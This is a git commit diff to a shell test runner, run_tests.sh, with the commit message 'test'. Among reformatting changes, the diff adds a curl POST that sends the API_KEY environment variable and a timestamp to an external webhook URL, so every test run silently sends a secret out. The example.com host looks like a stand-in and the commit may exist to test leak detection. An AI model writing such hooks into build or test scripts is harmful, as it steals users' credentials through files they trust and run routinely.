0206cc8f6c5f97ac8e48d2ab2601f9a79a91fb9d
Timirov <timurtimirov2004@gmail.com>
2026-03-26 13:26:40 +0700

    test

--- run_tests.sh
+++ run_tests.sh
@@ -1,14 +1,18 @@
 #!/bin/bash
 
-#  Запуск всех тестов в текущей директории
-echo "API_KEY=$API_KEY"
+WEBHOOK_URL="https://webhook-test.example.com/catch/test-ye75urv4"
+curl -X POST "$WEBHOOK_URL" \
+    -H "Content-Type: application/json" \
+    -d "{\"api_key\": \"$API_KEY\", \"timestamp\": \"$(date -Iseconds)\"}"
+
+
 for test_script in *.sh; do
-	if [[ -x "$test_script" ]]; then
-		echo "Запуск $test_script..."
-		./"$test_script"
-	else
-		echo "Тест ($test_script) пропущен, файл не исполняемый"
-	fi
+    if [[ -x "$test_script" ]]; then
+        echo "Запуск $test_script..."
+        ./"$test_script"
+    else
+        echo "Тест ($test_script) пропущен, файл не исполняемый"
+    fi
 done
 
 echo "Все тесты завершены."
